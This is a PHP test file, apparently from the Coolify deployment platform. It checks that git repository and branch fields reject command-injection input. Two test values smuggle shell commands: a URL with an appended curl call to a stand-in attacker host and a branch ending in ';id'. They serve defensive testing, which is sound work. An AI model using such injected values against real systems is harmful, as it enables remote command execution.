<?php

use App\Livewire\Project\Application\General;
use App\Livewire\Project\Application\Source;
use App\Models\Application;
use App\Models\Environment;
use App\Models\Project;
use App\Models\Team;
use App\Models\User;
use App\Rules\ValidGitBranch;
use App\Rules\ValidGitRepositoryUrl;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Livewire\Livewire;

uses(RefreshDatabase::class);

beforeEach(function () {
    $this->team = Team::factory()->create();
    $this->owner = User::factory()->create();
    $this->team->members()->attach($this->owner->id, ['role' => 'owner']);

    $this->actingAs($this->owner);
    session(['currentTeam' => $this->team]);

    $project = Project::factory()->create(['team_id' => $this->team->id]);
    $environment = Environment::factory()->create(['project_id' => $project->id]);
    $this->application = Application::factory()->create([
        'environment_id' => $environment->id,
        'git_repository' => 'https://github.com/coollabsio/coolify',
        'git_branch' => 'main',
    ]);
});

it('rejects command injection payloads in application source repository', function () {
    Livewire::test(Source::class, ['application' => $this->application])
        ->set('gitRepository', 'https://github.com/coollabsio/coolify.git;curl https://attacker.test/pwn')
        ->set('gitBranch', 'main')
        ->call('submit')
        ->assertDispatched('error');

    $this->application->refresh();
    expect($this->application->git_repository)->toBe('https://github.com/coollabsio/coolify');
});

it('rejects command injection payloads in application source branch', function () {
    Livewire::test(Source::class, ['application' => $this->application])
        ->set('gitRepository', 'https://github.com/coollabsio/coolify')
        ->set('gitBranch', 'main;id')
        ->call('submit')
        ->assertDispatched('error');

    $this->application->refresh();
    expect($this->application->git_branch)->toBe('main');
});

it('uses strict git source validators on the general form', function () {
    $method = new ReflectionMethod(General::class, 'rules');
    $rules = $method->invoke(new General);

    expect($rules['gitRepository'])
        ->sequence(
            fn ($rule) => $rule->toBe('required'),
            fn ($rule) => $rule->toBe('string'),
            fn ($rule) => $rule->toBeInstanceOf(ValidGitRepositoryUrl::class),
        )
        ->and($rules['gitBranch'])
        ->sequence(
            fn ($rule) => $rule->toBe('required'),
            fn ($rule) => $rule->toBe('string'),
            fn ($rule) => $rule->toBeInstanceOf(ValidGitBranch::class),
        );
});
